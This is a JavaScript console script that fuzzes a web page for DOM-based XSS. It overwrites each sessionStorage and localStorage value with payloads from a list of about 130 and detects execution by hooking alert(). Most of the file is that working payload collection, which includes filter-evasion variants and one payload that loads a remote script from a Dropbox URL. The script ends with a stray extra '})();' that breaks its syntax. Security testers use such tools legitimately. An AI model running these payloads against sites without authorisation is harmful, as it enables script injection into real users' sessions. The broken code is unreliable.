console.log("=== Storage DOM XSS Tester — app-driven, alert-confirmed ===");
(async function(){
const INJECTION_TIMEOUT_MS=1500,STEP_WAIT=140,MAX_PAYLOADS_PER_KEY=200,DO_RELOAD=false,SKIP_EMPTY_VALUES=true;
const SOURCES=["sessionStorage","localStorage"];
function n(){return"XSS"+Math.random().toString(36).slice(2,10)}
function now(){return Date.now()}
const orig={alert:window.alert};
window.__xss_alerts=[];
window.alert=function(m){try{window.__xss_alerts.push({msg:String(m),time:now()})}catch(e){};return orig.alert.apply(this,arguments)};
const PAYLOADS=JSON.parse(`[${[
"<img src=x onerror=alert(1)>",
"<svg/onload=alert(1)>",
"<iframe src='javascript:alert(1)'>",
"'><img src=x onerror=prompt(1)>",
"+123'];alert(1);[['",
"123',alert(1),'",
"123\",term:alert(1)//\"",
"123\";alert`1`;//",
"<script>alert(1)</script>",
"<input onfocus=alert(1) autofocus>",
"<details ontoggle=alert`xss`><summary>Click me</summary></details>",
"<whatever/onpointerover='var a=alert;a(1)'>",
"<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js'>",
"<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
"<img src=x onerror=\"var pop='ALERT(document.cookie);'; eval(pop.toLowerCase());\">",
"<a href='javascript:alert(document.domain)'>XSS</a>",
"<body onpageshow=alert(1)>",
"<object data='javascript:alert(1)'>",
"<audio src=x onerror=alert(1)>",
"<video src=x onerror=alert(1)>",
"<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>XSS</a>",
"javascript:alert(1)",
"\"><style>@keyframes x{}</style><div style=\"animation:x;\" onanimationstart=\"alert(1)\">",
"\"><img src=x onmouseover=alert(1)>",
"-prompt(8)-",
"'-prompt(8)-'",
"\";a=prompt,a()//",
"';a=prompt,a()//",
"'-eval(\"window\")-'",
"\"-eval(\\\"window\\\")-\"",
"\"onclick=prompt(8)>\"@x.y",
"\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
"<image/src/onerror=prompt(8)>",
"<img/src/onerror=prompt(8)>",
"<image src/onerror=prompt(8)>",
"<img src/onerror=prompt(8)>",
"<image src =q onerror=prompt(8)>",
"<img src =q onerror=prompt(8)>",
"</scrip</script>t><img src =q onerror=prompt(8)>",
"<script\\x20type='text/javascript'>javascript:alert(1);</script>",
"<script\\x3Etype='text/javascript'>javascript:alert(1);</script>",
"<script\\x0Dtype='text/javascript'>javascript:alert(1);</script>",
"<script\\x09type='text/javascript'>javascript:alert(1);</script>",
"<script\\x0Ctype='text/javascript'>javascript:alert(1);</script>",
"<script\\x2Ftype='text/javascript'>javascript:alert(1);</script>",
"<script\\x0Atype='text/javascript'>javascript:alert(1);</script>",
"'`\">\\x3Cscript>javascript:alert(1)</script>",
"'`\">\\x00script>javascript:alert(1)</script>",
"<img src=1 href=1 onerror='javascript:alert(1)'></img>",
"<audio src=1 href=1 onerror='javascript:alert(1)'></audio>",
"<video src=1 href=1 onerror='javascript:alert(1)'></video>",
"<body src=1 href=1 onerror='javascript:alert(1)'></body>",
"<image src=1 href=1 onerror='javascript:alert(1)'></image>",
"<object src=1 href=1 onerror='javascript:alert(1)'></object>",
"<script src=1 href=1 onerror='javascript:alert(1)'></script>",
"<svg onResize svg onResize='javascript:javascript:alert(1)'></svg onResize>",
"<title onPropertyChange title onPropertyChange='javascript:javascript:alert(1)'></title onPropertyChange>",
"<iframe onLoad iframe onLoad='javascript:javascript:alert(1)'></iframe onLoad>",
"<body onMouseEnter body onMouseEnter='javascript:javascript:alert(1)'></body onMouseEnter>",
"<body onFocus body onFocus='javascript:javascript:alert(1)'></body onFocus>",
"<frameset onScroll frameset onScroll='javascript:javascript:alert(1)'></frameset onScroll>",
"<script onReadyStateChange script onReadyStateChange='javascript:javascript:alert(1)'></script onReadyStateChange>",
"<html onMouseUp html onMouseUp='javascript:javascript:alert(1)'></html onMouseUp>",
"<body onPropertyChange body onPropertyChange='javascript:javascript:alert(1)'></body onPropertyChange>",
"<svg onLoad svg onLoad='javascript:javascript:alert(1)'></svg onLoad>",
"<body onPageHide body onPageHide='javascript:javascript:alert(1)'></body onPageHide>",
"<body onMouseOver body onMouseOver='javascript:javascript:alert(1)'></body onMouseOver>",
"<body onUnload body onUnload='javascript:javascript:alert(1)'></body onUnload>",
"<body onLoad body onLoad='javascript:javascript:alert(1)'></body onLoad>",
"<bgsound onPropertyChange bgsound onPropertyChange='javascript:javascript:alert(1)'></bgsound onPropertyChange>",
"<html onMouseLeave html onMouseLeave='javascript:javascript:alert(1)'></html onMouseLeave>",
"<html onMouseWheel html onMouseWheel='javascript:javascript:alert(1)'></html onMouseWheel>",
"<style onLoad style onLoad='javascript:javascript:alert(1)'></style onLoad>",
"<iframe onReadyStateChange iframe onReadyStateChange='javascript:javascript:alert(1)'></iframe onReadyStateChange>",
"<body onPageShow body onPageShow='javascript:javascript:alert(1)'></body onPageShow>",
"<style onReadyStateChange style onReadyStateChange='javascript:javascript:alert(1)'></style onReadyStateChange>",
"<frameset onFocus frameset onFocus='javascript:javascript:alert(1)'></frameset onFocus>",
"<applet onError applet onError='javascript:javascript:alert(1)'></applet onError>",
"<marquee onStart marquee onStart='javascript:javascript:alert(1)'></marquee onStart>",
"<script onLoad script onLoad='javascript:javascript:alert(1)'></script onLoad>",
"<html onMouseOver html onMouseOver='javascript:javascript:alert(1)'></html onMouseOver>",
"<html onMouseEnter html onMouseEnter='javascript:parent.javascript:alert(1)'></html onMouseEnter>",
"<body onBeforeUnload body onBeforeUnload='javascript:javascript:alert(1)'></body onBeforeUnload>",
"<html onMouseDown html onMouseDown='javascript:javascript:alert(1)'></html onMouseDown>",
"<marquee onScroll marquee onScroll='javascript:javascript:alert(1)'></marquee onScroll>",
"<xml onPropertyChange xml onPropertyChange='javascript:javascript:alert(1)'></xml onPropertyChange>",
"<frameset onBlur frameset onBlur='javascript:javascript:alert(1)'></frameset onBlur>",
"<applet onReadyStateChange applet onReadyStateChange='javascript:javascript:alert(1)'></applet onReadyStateChange>",
"<svg onUnload svg onUnload='javascript:javascript:alert(1)'></svg onUnload>",
"<html onMouseOut html onMouseOut='javascript:javascript:alert(1)'></html onMouseOut>",
"<body onMouseMove body onMouseMove='javascript:javascript:alert(1)'></body onMouseMove>",
"<body onResize body onResize='javascript:javascript:alert(1)'></body onResize>",
"<object onError object onError='javascript:javascript:alert(1)'></object onError>",
"<body onPopState body onPopState='javascript:javascript:alert(1)'></body onPopState>",
"<html onMouseMove html onMouseMove='javascript:javascript:alert(1)'></html onMouseMove>",
"<applet onreadystatechange applet onreadystatechange='javascript:javascript:alert(1)'></applet onreadystatechange>",
"<body onpagehide body onpagehide='javascript:javascript:alert(1)'></body onpagehide>",
"<svg onunload svg onunload='javascript:javascript:alert(1)'></svg onunload>",
"<applet onerror applet onerror='javascript:javascript:alert(1)'></applet onerror>",
"<body onkeyup body onkeyup='javascript:javascript:alert(1)'></body onkeyup>",
"<body onunload body onunload='javascript:javascript:alert(1)'></body onunload>",
"<iframe onload iframe onload='javascript:javascript:alert(1)'></iframe onload>",
"<body onload body onload='javascript:javascript:alert(1)'></body onload>",
"<html onmouseover html onmouseover='javascript:javascript:alert(1)'></html onmouseover>",
"<object onbeforeload object onbeforeload='javascript:javascript:alert(1)'></object onbeforeload>",
"<body onbeforeunload body onbeforeunload='javascript:javascript:alert(1)'></body onbeforeunload>",
"<body onfocus body onfocus='javascript:javascript:alert(1)'></body onfocus>",
"<body onkeydown body onkeydown='javascript:javascript:alert(1)'></body onkeydown>",
"<iframe onbeforeload iframe onbeforeload='javascript:javascript:alert(1)'></iframe onbeforeload>",
"<iframe src iframe src='javascript:javascript:alert(1)'></iframe src>",
"<svg onload svg onload='javascript:javascript:alert(1)'></svg onload>",
"<html onmousemove html onmousemove='javascript:javascript:alert(1)'></html onmousemove>",
"<body onblur body onblur='javascript:javascript:alert(1)'></body onblur>",
"\\x3Cscript>javascript:alert(1)</script>",
"'\"`><script>/* *\\x2Fjavascript:alert(1)// */</script>",
"<script>javascript:alert(1)</script\\x0D",
"<script>javascript:alert(1)</script\\x0A",
"<script>javascript:alert(1)</script\\x0B",
"<script charset='\\x22>javascript:alert(1)</script>",
"<!--\\x3E<img src=xxx:x onerror=javascript:alert(1)> -->",
"--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->",
"--><!-- --\\x00> <img src=xxx:x onerror=javascript:alert(1)> -->",
"--><!-- --\\x21> <img src=xxx:x onerror=javascript:alert(1)> -->",
"--><!-- --\\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->",
"`\"'><img src='#\\x27 onerror=javascript:alert(1)>",
"<a href='javascript\\x3Ajavascript:alert(1)' id='fuzzelement1'>test</a>"
].map(s=>JSON.stringify(s)).join(",")}]`);
function mutate(p,nonce){let r=p;r=r.replace(/alert\s*\([^)]*\)/gi,`alert('XSS:${nonce}')`);r=r.replace(/prompt\s*\([^)]*\)/gi,`alert('XSS:${nonce}')`);r=r.replace(/confirm\s*\([^)]*\)/gi,`alert('XSS:${nonce}')`);return r}
async function nudge(nonce){try{const u=new URL(location.href);u.searchParams.set("_x",nonce);history.pushState({},"",u.toString());dispatchEvent(new Event("popstate"));const h="#x"+nonce;if(location.hash!==h){location.hash=h;dispatchEvent(new HashChangeEvent("hashchange"))}await new Promise(r=>setTimeout(r,STEP_WAIT));if(DO_RELOAD){location.reload();await new Promise(r=>setTimeout(r,600))}}catch(e){}}
async function testKey(src,key,origVal){
let tested=0,hit=false;
for(let i=0;i<PAYLOADS.length&&i<MAX_PAYLOADS_PER_KEY;i++){
const nonce=n(),payload=mutate(PAYLOADS[i],nonce),start=window.__xss_alerts.length,t0=now();
try{window[src].setItem(key,payload)}catch(e){}
await nudge(nonce);
await new Promise(r=>setTimeout(r,STEP_WAIT));
const alerts=window.__xss_alerts.slice(start);
for(const a of alerts){if(typeof a.msg==="string"&&a.msg.indexOf(`XSS:${nonce}`)!==-1&&a.time-t0<=INJECTION_TIMEOUT_MS){results.push({storage:src,key,payload:PAYLOADS[i],detectedAt:new Date(a.time).toISOString(),note:"executed by app"});hit=true;break}}
if(hit)break;
tested++;
}
try{if(origVal===null||origVal===undefined)window[src].removeItem(key);else window[src].setItem(key,origVal)}catch(e){}
}
const snapshot={};
for(const s of SOURCES){snapshot[s]={};try{for(let i=0;i<window[s].length;i++){const k=window[s].key(i);snapshot[s][k]=window[s].getItem(k)}}catch(e){}}
const results=[];
for(const s of SOURCES){const keys=Object.keys(snapshot[s]||{});for(const k of keys){const v=snapshot[s][k];if(SKIP_EMPTY_VALUES&&(!v||typeof v!=="string"||!v.length))continue;await testKey(s,k,v)}}
console.log("Completed. Confirmed:",results.length);
if(results.length){console.table(results);const blob=new Blob([JSON.stringify(results,null,2)],{type:"application/json"});const url=URL.createObjectURL(blob);const a=document.createElement("a");a.href=url;a.download=`xss_confirmed_app_${Date.now()}.json`;a.click();setTimeout(()=>URL.revokeObjectURL(url),3000)}else{console.log("No alert-confirmed execution from storage by the app")}
window.alert=orig.alert;
})();

    
})();

